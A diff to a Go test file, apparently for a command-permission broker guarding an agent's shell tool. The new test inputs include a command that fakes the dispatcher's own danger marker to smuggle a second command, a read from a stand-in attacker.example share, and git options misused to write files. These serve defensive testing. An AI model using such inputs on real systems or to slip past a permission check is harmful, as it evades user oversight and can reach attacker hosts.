@@ -38,6 +38,17 @@ func TestReadOnlyExec_BrokerAsks(t *testing.T) {
 			"sort -o out in",
 			"date -s '2020-01-01'",
 			"hostname evil",
+			// Round two. The first writes the dispatcher's own danger note into
+			// the command: the broker used to judge only the text before it.
+			"echo hi  [DANGER: x]; touch made-by-the-tail",
+			"git status --help",
+			"git log --show-signature -1",
+			`git log '--out"put=victim.txt'`,
+			`Get-Content \\attacker.example\share\x.txt`,
+			"git remote show origin",
+			"HEAD -m POST http://127.0.0.1:9/x",
+			"sort -T . -S 1k big",
+			"file -p victim.txt",
 		} {
 			before := asked
 			if b.Confirm(ctx, "os_exec", cmd) {
@@ -48,7 +59,7 @@ func TestReadOnlyExec_BrokerAsks(t *testing.T) {
 			}
 		}
 		for _, cmd := range []string{"env", "env FOO=bar", "printenv", "date", "date +%s", "hostname",
-			`Get-Item C:\x`, "Get-ChildItem", "git status", "ls -la | grep x"} {
+			`Get-Item C:\x`, "Get-ChildItem", "git status", "ls -la | grep x", "date -u", "hostname -f"} {
 			before := asked
 			if !b.Confirm(ctx, "os_exec", cmd) {
 				t.Errorf("%s: the read-only command %q did not run", name, cmd)
